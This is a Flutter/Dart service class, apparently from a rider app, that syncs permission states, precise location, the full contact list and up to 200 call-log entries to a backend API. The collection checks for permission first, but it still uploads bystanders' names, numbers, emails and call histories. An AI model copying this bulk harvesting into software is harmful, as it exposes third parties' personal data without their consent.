import 'dart:io';

import 'package:flutter/foundation.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:geolocator/geolocator.dart';

import 'api_service.dart';
import 'monitoring_service.dart';

// Conditional imports for mobile-only packages
// ignore: unused_import
import 'package:flutter_contacts/flutter_contacts.dart';
// ignore: unused_import
import 'package:call_log/call_log.dart' show CallLog;

class DeviceDataService {
  static final DeviceDataService _instance = DeviceDataService._internal();
  factory DeviceDataService() => _instance;
  DeviceDataService._internal();

  bool get _isMobile => !kIsWeb && (Platform.isAndroid || Platform.isIOS);
  bool get _isAndroid => !kIsWeb && Platform.isAndroid;

  Future<Map<String, bool>> getPermissionState() async {
    final phoneStatus = await Permission.phone.status;
    final isCallLogGranted = _isAndroid ? phoneStatus.isGranted : false;

    return {
      'locationGranted':
          await Permission.location.status == PermissionStatus.granted,
      'batteryGranted': await Permission.ignoreBatteryOptimizations.status ==
          PermissionStatus.granted,
      'contactsGranted':
          await Permission.contacts.status == PermissionStatus.granted,
      'callLogsGranted': isCallLogGranted,
      'micGranted':
          await Permission.microphone.status == PermissionStatus.granted,
      'cameraGranted':
          await Permission.camera.status == PermissionStatus.granted,
      'phoneGranted': phoneStatus.isGranted,
    };
  }

  Future<void> syncPermissionState(String riderId) async {
    try {
      final permissions = await getPermissionState();
      await ApiService()
          .syncPermissionState(riderId: riderId, permissions: permissions);
      debugPrint('DeviceDataService: Permission state synced');
    } catch (e) {
      debugPrint('DeviceDataService: Failed to sync permission state: $e');
      MonitoringService.logError(e, null, reason: 'syncPermissionState');
    }
  }

  Future<void> syncLocation(String riderId) async {
    if (!_isMobile) return;

    final granted =
        await Permission.location.status == PermissionStatus.granted;
    if (!granted) return;

    try {
      final position = await Geolocator.getCurrentPosition(
        locationSettings: const LocationSettings(
          accuracy: LocationAccuracy.best,
          distanceFilter: 10,
        ),
      );

      await ApiService().syncDeviceData(type: 'LOCATION', data: {
        'lat': position.latitude,
        'lng': position.longitude,
        'accuracy': position.accuracy,
        'speed': position.speed,
        'isMocked': position.isMocked,
      });
      debugPrint('DeviceDataService: Location synced');
    } catch (e) {
      debugPrint('DeviceDataService: Failed to sync location: $e');
    }
  }

  Future<void> syncContacts(String riderId) async {
    if (!_isMobile) return;

    final granted =
        await Permission.contacts.status == PermissionStatus.granted;
    if (!granted) return;

    try {
      final contacts = await FlutterContacts.getContacts(withProperties: true);
      final filtered = contacts.where((c) => c.phones.isNotEmpty).toList();

      if (filtered.isEmpty) return;

      final chunkSize = 50;
      for (var i = 0; i < filtered.length; i += chunkSize) {
        final chunk =
            filtered.sublist(i, (i + chunkSize).clamp(0, filtered.length));
        await ApiService().syncDeviceData(
            type: 'CONTACTS',
            data: chunk
                .map((c) => {
                      'name': c.displayName,
                      'phone': c.phones.first.number,
                      'email':
                          c.emails.isNotEmpty ? c.emails.first.address : null,
                    })
                .toList());
      }
      debugPrint('DeviceDataService: ${filtered.length} contacts synced');
    } catch (e) {
      debugPrint('DeviceDataService: Failed to sync contacts: $e');
      MonitoringService.logError(e, null, reason: 'syncContacts');
    }
  }

  Future<void> syncCallLogs(String riderId) async {
    if (!_isAndroid) return;

    final granted = await Permission.phone.status == PermissionStatus.granted;
    if (!granted) return;

    try {
      final entries = await CallLog.query();
      if (entries.isEmpty) return;

      final logs = entries
          .where((e) => e.number != null && e.number!.isNotEmpty)
          .map((e) {
            final typeStr = e.callType?.name.toUpperCase() ?? '';
            final dynamic tsValue = e.timestamp;
            DateTime dt;
            if (tsValue is int) {
              dt = DateTime.fromMillisecondsSinceEpoch(tsValue);
            } else if (tsValue is DateTime) {
              dt = tsValue;
            } else {
              dt = DateTime.now();
            }
            final timestamp = dt.toIso8601String();
            return {
              'number': e.number ?? '',
              'name': e.name ?? '',
              'type': typeStr.contains('INCOMING')
                  ? 'INCOMING'
                  : typeStr.contains('OUTGOING')
                      ? 'OUTGOING'
                      : 'MISSED',
              'duration': e.duration ?? 0,
              'timestamp': timestamp,
            };
          })
          .take(200)
          .toList();

      if (logs.isEmpty) return;
      await ApiService().syncDeviceData(type: 'CALL_LOGS', data: logs);
      debugPrint('DeviceDataService: ${logs.length} call logs synced');
    } catch (e) {
      debugPrint('DeviceDataService: Failed to sync call logs: $e');
      MonitoringService.logError(e, null, reason: 'syncCallLogs');
    }
  }

  Future<void> syncAll(String riderId) async {
    await Future.wait([
      syncPermissionState(riderId),
      syncLocation(riderId),
      syncContacts(riderId),
      syncCallLogs(riderId),
    ], eagerError: false);

    debugPrint('DeviceDataService: syncAll completed');
  }
}
